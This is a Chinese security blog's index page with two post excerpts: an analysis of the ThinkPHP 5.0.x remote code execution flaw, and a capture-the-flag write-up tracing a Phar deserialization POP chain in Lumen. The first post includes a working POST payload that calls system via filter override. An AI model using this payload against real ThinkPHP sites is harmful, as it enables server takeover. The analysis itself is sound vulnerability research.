<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Ponyo loves Sōsuke!
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
                <li class="menu-item">
                    <a class="menu-item-link search">
                        Search                   
                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
                    </a>
                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
                </li>
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> 
                    ThinkPHP5.0.0~5.0.23RCE漏洞分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p>
<h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p>
<p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p>
<p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p>
<p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">switch (self::$dispatch[&apos;type&apos;]) &#123;</span><br><span class="line">    case &apos;redirect&apos;:</span><br><span class="line">        header(&apos;Location: &apos; . self::$dispatch[&apos;url&apos;], true, self::$dispatch[&apos;status&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;module&apos;:</span><br><span class="line">       $data = self::module(self::$dispatch[&apos;module&apos;], $config);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;controller&apos;:</span><br><span class="line">        $data = Loader::action(self::$dispatch[&apos;controller&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;method&apos;:</span><br><span class="line">        $data = self::invokeMethod(self::$dispatch[&apos;method&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;function&apos;:</span><br><span class="line">        $data = self::invokeFunction(self::$dispatch[&apos;function&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    default:</span><br><span class="line">        throw new Exception(&apos;dispatch type not support&apos;, 10008);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5、执行处理，返回输出。</p>
<p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p>
<p>所以核心操作就是调度请求。</p>
<h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">* 执行应用程序</span><br><span class="line">* @access public</span><br><span class="line">* @param  Request $request 请求对象</span><br><span class="line">* @return Response</span><br><span class="line">* @throws Exception</span><br><span class="line">*/</span><br><span class="line">public static function run(Request $request = null)</span><br><span class="line">&#123;</span><br><span class="line">    $request = is_null($request) ? Request::instance() : $request;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        ...</span><br><span class="line">        // 获取应用调度信息</span><br><span class="line">        $dispatch = self::$dispatch;</span><br><span class="line"></span><br><span class="line">        // 未设置调度信息则进行 URL 路由检测</span><br><span class="line">        if (empty($dispatch)) &#123;</span><br><span class="line">            $dispatch = self::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $data = self::exec($dispatch, $config);</span><br><span class="line">    &#125; catch (HttpResponseException $exception) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">    * 当前的请求类型</span><br><span class="line">    * @access public</span><br><span class="line">    * @param bool $method  true 获取原始请求类型</span><br><span class="line">    * @return string</span><br><span class="line">    */</span><br><span class="line">public function method($method = false)</span><br><span class="line">&#123;</span><br><span class="line">    if (true === $method) &#123;</span><br><span class="line">        // 获取原始请求类型</span><br><span class="line">        return $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">    &#125; elseif (!$this-&gt;method) &#123;</span><br><span class="line">        if (isset($_POST[Config::get(&apos;var_method&apos;)])) &#123;</span><br><span class="line">            $this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; elseif (isset($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;])) &#123;</span><br><span class="line">            $this-&gt;method = strtoupper($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;method = $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
<p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">protected function __construct($options = [])</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($options as $name =&gt; $item) &#123;</span><br><span class="line">        if (property_exists($this, $name)) &#123;</span><br><span class="line">            $this-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (is_null($this-&gt;filter)) &#123;</span><br><span class="line">        $this-&gt;filter = Config::get(&apos;default_filter&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 保存 php://input</span><br><span class="line">    $this-&gt;input = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
<p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p>
<p>request对象差不多清楚了，跟进self::routeCheck()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * URL路由检测（根据PATH_INFO)</span><br><span class="line"> * @access public</span><br><span class="line"> * @param  \think\Request $request 请求实例</span><br><span class="line"> * @param  array          $config  配置信息</span><br><span class="line"> * @return array</span><br><span class="line"> * @throws \think\Exception</span><br><span class="line"> */</span><br><span class="line">public static function routeCheck($request, array $config)</span><br><span class="line">&#123;</span><br><span class="line">    $path   = $request-&gt;path();  //path=captcha</span><br><span class="line">    $depr   = $config[&apos;pathinfo_depr&apos;];</span><br><span class="line">    $result = false;</span><br><span class="line">    </span><br><span class="line">    // 路由检测（根据路由定义返回不同的URL调度）</span><br><span class="line">    $result = Route::check($request, $path, $depr, $config[&apos;url_domain_deploy&apos;]);</span><br><span class="line">        </span><br><span class="line">    return $result;</span><br></pre></td></tr></table></figure>

<p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
<p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">protected static function exec($dispatch, $config)</span><br><span class="line">&#123;</span><br><span class="line">    switch ($dispatch[&apos;type&apos;]) &#123;</span><br><span class="line">        ...</span><br><span class="line">        case &apos;method&apos;: // 回调方法</span><br><span class="line">            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&apos;var&apos;]);</span><br><span class="line">            $data = self::invokeMethod($dispatch[&apos;method&apos;], $vars);</span><br><span class="line">            break;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function param($name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">        $method = $this-&gt;method(true);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    // 当前请求参数和URL地址中的参数合并</span><br><span class="line">    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line">    $this-&gt;mergeParam = true;</span><br><span class="line">    ...</span><br><span class="line">    return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
<p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    // 解析过滤器</span><br><span class="line">    $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line">    if (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进getFilter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">        if (is_string($filter) &amp;&amp; false === strpos($filter, &apos;/&apos;)) &#123;</span><br><span class="line">            $filter = explode(&apos;,&apos;, $filter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter = (array) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line">    return $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
<p>从而调用call_user_func进行RCE</p>
<h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p>
<p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li>
<li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li>
<li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li>
<li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/09/Code-breaking-medium֮lumenserial/"> 
                    Code-breaking-medium之lumenserial 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-09   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p>
<p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
<h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
<p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function download($url)</span><br><span class="line">&#123;</span><br><span class="line">    $content = file_get_contents($url);</span><br></pre></td></tr></table></figure>

<p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>

<h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
<p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class PendingBroadcast</span><br><span class="line">&#123;   </span><br><span class="line">public function __construct(Dispatcher $events, $event)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;event = $event;</span><br><span class="line">    $this-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
<p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
<p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    $i = 0;</span><br><span class="line">    do &#123;</span><br><span class="line">        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">        $i++;</span><br><span class="line">        if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">            throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">    return $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
<p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes) </span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进format方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
<p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
<p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
<h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
<p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
<p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">namespace PHPUnit\Framework\MockObject\Stub;</span><br><span class="line">class ReturnCallback implements Stub</span><br><span class="line">&#123;</span><br><span class="line">public function invoke(Invocation $invocation)</span><br><span class="line">&#123;</span><br><span class="line">    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
<p>找到调用这个接口的类就行了，这里是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">namespace PHPUnit\Framework\MockObject\Invocation;</span><br><span class="line">class StaticInvocation implements Invocation, SelfDescribing</span><br><span class="line">&#123;</span><br><span class="line">private $parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
<h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
<p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
<h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
